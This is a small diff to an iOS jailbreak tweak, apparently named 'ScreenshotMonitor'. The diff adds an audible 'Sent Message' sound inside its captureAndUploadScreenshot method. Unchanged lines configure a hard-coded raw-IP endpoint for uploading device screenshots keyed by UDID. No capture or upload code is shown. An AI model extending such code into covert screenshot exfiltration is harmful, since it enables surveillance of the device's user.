@@ -1,6 +1,7 @@
 #import <UIKit/UIKit.h>
 #import <Foundation/Foundation.h>
 #import <SpringBoard/SpringBoard.h>
+#import <AudioToolbox/AudioToolbox.h>
 
 // Configuration - Change these values
 static NSString *API_ENDPOINT = @"https://186.190.215.38:3000/screenshots/device/";
@@ -39,7 +40,8 @@ static NSString *DEVICE_ID = nil; // Will be set to device UDID
 
 %new
 -(void)captureAndUploadScreenshot {
-    NSLog(@"[ScreenshotMonitor] captureAndUploadScreenshot called!");
+    AudioServicesPlaySystemSound(1007); // This will play the "Sent Message" sound
+    // You can change 1007 to another system sound ID if you want a different sound
 }
 
 %new
